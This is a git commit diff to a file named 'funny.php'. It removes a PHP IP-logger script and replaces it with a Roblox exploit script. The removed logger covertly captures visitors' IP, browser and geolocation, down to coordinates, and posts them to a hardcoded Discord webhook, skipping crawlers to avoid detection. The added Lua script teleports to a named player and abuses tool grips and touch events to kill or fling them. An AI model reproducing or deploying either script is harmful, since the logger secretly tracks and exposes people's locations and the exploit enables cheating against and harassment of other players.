fbcbe48d12304609a30077026e34bcc9411c1a85
qcox <79946044+qcox@users.noreply.github.com>
2022-05-26 00:11:09 +0200

    Update funny.php

--- funny.php
+++ funny.php
@@ -1,150 +1,41 @@
-<?php
+getgenv().skid = "ballas"
+				local function findPlayer(name)
+					for _, Player in ipairs(game.Players:GetPlayers()) do
+						if (string.lower(name) == string.sub(string.lower(Player.Name), 1, #name)) then
+							return Player;
+						end
+					end
+				end
+				getgenv().rejoin = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
+					if child.Name == 'ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
+game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
+					end
+				end)
+				local thes2 = tostring(findPlayer(getgenv().skid))
+				local target = game.Players:FindFirstChild(thes2)
+				if target then
+					local lp = game.Players.LocalPlayer
+					local ch = lp.Character
+					local tool = lp.Backpack.Wallet
+					local CFrameTool = function(tool, pos)
+						local RightArm = ch:FindFirstChild("RightLowerArm") or ch:FindFirstChild("Right Arm")
+						local Arm = RightArm.CFrame * CFrame.new(0, -1, 0, 1, 0, 0, 0, 0, 1, 0, -1, 0)
+						local Frame = Arm:ToObjectSpace(pos):Inverse()
+	
+						tool.Grip = Frame
+					end
+					game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[thes2].Character.HumanoidRootPart.CFrame
+					local targetroot = target.Character:FindFirstChild("UpperTorso") or target.Character:FindFirstChild("Torso")
+					local newHum = lp.Character.Humanoid:Clone()
+					newHum.Parent = lp.Character
+					lp.Character.Humanoid:Destroy()
+					newHum:ChangeState(15)
+					tool.Parent = ch
+					tool.Handle.Size = Vector3.new(1, 1, 1)
+					CFrameTool(tool, targetroot.CFrame)
+					firetouchinterest(targetroot, tool.Handle, 0)
+					firetouchinterest(targetroot, tool.Handle, 1)
+					else
+					    print('lol ragequit')
+				end
 
-$Webhook    = "https://discord.com/api/webhooks/899014509958672404/4dxaxW-iNHgAXbArx_x1gUPbBmhH6K0T-Lx0jlkV48r5R9qQvKQXp0bxxNoNkZPELr-S"; //Webhook here
-$WebhookTag = "Ip Logger"; //Name this whatever you want
-$WebhookAvatar = "https://vgy.me/GQe9bJ.png"; //Change this to your the avatar you prefer
-$DEmbedColor = "FFFFFF"; //Change the color of the Discord Embed must be in hex "FFFFFF"
-
-//                        Dont Edit Unless You Know What You're Doing!
-//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\
-//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\
-
-$IP       = $_SERVER['REMOTE_ADDR'];
-$Browser  = $_SERVER['HTTP_USER_AGENT'];
-$URL = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-
-if(preg_match('/bot|Discord|robot|curl|spider|crawler|Cloudflare-SSLDetector|^$/i', $Browser)) {
-    exit();
-}
-
-$Curl = curl_init("http://ip-api.com/json/$IP");
-curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
-$Info = json_decode(curl_exec($Curl)); 
-curl_close($Curl);
-
-$ISP = $Info->isp;
-$Status = $Info->status;
-$Country = $Info->country;
-$countryCode = $Info->countryCode;
-$Region = $Info->regionName;
-$City = $Info->city;
-$Tz = $Info->timezone;
-$Zip = $Info->zip;
-$COORD = "$Info->lat, $Info->lon"; 
-$flag = "https://www.countryflags.io/{$countryCode}/flat/64.png";
-$timestamp = date("Y-m-d H:i:s");
-
-
-$hookObject = json_encode([ // Discord Embed Message
-    'username'   => "$WebhookTag" , 
-    'avatar_url' => "$WebhookAvatar",
-    "embeds" => [
-        /*
-         * Our first embed
-         */
-        [
-            "title" => "Ip Logger",
-            
-            // The type of your embed, will ALWAYS be "rich"
-            "type" => "rich",
-            
-            /* A timestamp to be displayed below the embed, IE for when an an article was posted
-             * This must be formatted as ISO8601
-             */
-            "timestamp" => "$timestamp",
-            
-            // The integer color to be used on the left side of the embed
-            "color" => hexdec( "$DEmbedColor" ),
-            
-            // Footer object
-            "footer" => [
-                "text" => "$WebhookTag | IP Logger",
-                "icon_url" => "$WebhookAvatar"
-            ],
-            "thumbnail" => [
-                "url" => "$flag"
-            ],
-            // Author object
-            "author" => [
-                "name" => "Made By Whisk | github.com/Wh7sk",
-                "url" => "https://github.com/Wh7sk"
-            ],
-            // Field array of objects
-            "fields" => [
-                // Field 1
-                [
-                    "name" => "URL Header Logged",
-                    "value" => "$URL",
-                    "inline" => false
-                ],
-                [
-                    "name" => "IP",
-                    "value" => "$IP",
-                    "inline" => true
-                ],
-                [
-                    "name" => "ISP",
-                    "value" => "$ISP",
-                    "inline" => true
-                ],
-                [
-                    "name" => "Status",
-                    "value" => "$Status",
-                    "inline" => true
-                ],
-                [
-                    "name" => "Browser",
-                    "value" => "$Browser",
-                    "inline" => false
-                ],
-                [
-                    "name" => "Country",
-                    "value" => "$Country",
-                    "inline" => true
-                ],
-                [
-                    "name" => "Region",
-                    "value" => "$Region",
-                    "inline" => true
-                ],
-                [
-                    "name" => "City",
-                    "value" => "$City",
-                    "inline" => true
-                ],
-                [
-                    "name" => "Timezone",
-                    "value" => "$Tz",
-                    "inline" => true
-                ],
-                [
-                    "name" => "Postal/Zip",
-                    "value" => "$Zip",
-                    "inline" => true
-                ],
-                [
-                    "name" => "Coordinates",
-                    "value" => "$COORD",
-                    "inline" => true
-                ],
-            ]
-        ]
-    ]
-
-], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
-
-$ch = curl_init();
-
-curl_setopt_array( $ch, [
-    CURLOPT_URL => $Webhook,
-    CURLOPT_POST => true,
-    CURLOPT_POSTFIELDS => $hookObject,
-    CURLOPT_HTTPHEADER => [
-        "Content-Type: application/json"
-    ]
-]);
-
-$response = curl_exec( $ch );
-curl_close( $ch );
-
-?>
